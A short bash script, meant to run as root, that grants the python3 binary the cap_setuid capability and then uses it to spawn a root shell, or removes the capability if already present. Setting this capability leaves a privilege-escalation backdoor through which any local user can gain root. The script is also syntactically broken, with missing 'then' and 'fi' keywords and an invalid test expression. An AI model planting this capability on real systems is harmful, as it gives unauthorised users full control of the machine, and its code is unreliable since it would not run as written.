#!/bin/bash

# execute with root user

pathFile=`readlink -f $(which python3)`

if [ -f "$pathFile" ]; then
   if [[ `getcap $pathFile`| awk '{ print $2}' -eq 'cap_setuid=ep' ]]
      echo "DELETE capability"
      setcap -r $pathFile
   else
      setcap cap_setuid+ep $pathFile
      $pathFile -c 'import os; os.setuid(0); os.system("/bin/bash")'
else
   echo "Python3 no existe"
fi
